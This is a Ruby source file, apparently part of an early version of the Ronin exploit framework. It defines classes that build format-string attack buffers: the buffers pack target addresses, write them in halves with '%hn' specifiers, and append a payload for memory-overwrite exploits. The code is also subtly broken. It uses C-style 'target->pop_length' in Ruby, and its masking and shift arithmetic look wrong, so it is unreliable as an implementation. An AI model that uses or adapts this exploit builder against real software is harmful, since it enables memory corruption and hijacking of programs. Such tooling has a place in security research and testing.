require 'target'
require 'platformexploit'

module Ronin
  class FormatStringTarget < Target

    # Pop length
    attr_reader :pop_length

    # Address
    attr_reader :address

    # Overwrite
    attr_reader :overwrite

    def initialize(pop_length,address,overwrite)
      @pop_length = pop_length 
      @address = address 
      @overwrite = overwrite
    end

  end

  class FormatString < PlatformExploit

    def initialize(advisory=nil)
      super(advisory)
    end

    def build_format_string(target=get_target,payload="")
      buffer = target.overwrite.pack(target.platform.arch)+(target.overwrite+(target.platform.arch.address_length/2)).pack(target.platform.arch)

      low_mask = 0xff
      (target.platform.arch.address_length/2).times do
	low_mask <<= 8
	low_mask |= 0xff
      end

      high_mask = low_mask << (target.platform.arch.address_length*4)
      high = (target.address & high_mask) >> (target.platform.arch.address_length/2)
      low = target.address & low_mask

      if low<high
	low-=(target.platform.arch.address_length*2)
	buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",low,target.pop_length,high-low,target->pop_length+1)
      else
	high-=(target.platform.arch.address_length*2)
	buffer+=format("%%.%ud%%%lu$hn%%.%ud%%%lu$hn",high,target.pop_length+1,low-high,target->pop_length)
      end
      buffer+=payload

      return buffer
    end

  end
end
